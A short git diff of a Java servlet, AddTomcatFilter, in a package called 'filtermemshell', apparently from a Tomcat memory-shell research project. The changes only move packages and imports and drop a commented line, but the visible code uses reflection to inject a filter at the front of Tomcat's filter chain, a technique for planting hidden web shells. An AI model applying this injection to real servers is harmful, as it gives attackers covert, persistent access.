@@ -1,8 +1,9 @@
-package cc.saferoad.servlet;/*
+package cc.saferoad.servlet.filtermemshell;/*
 @auther S0cke3t
 @date 2021-12-27
 */
 
+import cc.saferoad.Test.DynamicUtils;
 import org.apache.catalina.core.ApplicationFilterConfig;
 import org.apache.catalina.core.StandardContext;
 /*
@@ -29,7 +30,7 @@ import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.util.HashMap;
 
-import static cc.saferoad.servlet.DynamicUtils.FILTER_CLASS_STRING;
+import static cc.saferoad.Test.DynamicUtils.FILTER_CLASS_STRING;
 
 @WebServlet(name = "AddTomcatFilter", value = "/AddTomcatFilter")
 public class AddTomcatFilter extends HttpServlet {
@@ -96,7 +97,6 @@ public class AddTomcatFilter extends HttpServlet {
                 Class cl = Class.forName("org.apache.catalina.core.StandardContext$ContextFilterMaps");
                 // addBefore 将 filter 放在第一位
                 Method m = cl.getDeclaredMethod("addBefore", FilterMap.class);
-//				Method m = cl.getDeclaredMethod("add", FilterMap.class);
                 m.setAccessible(true);
                 m.invoke(object, filterMap);
 
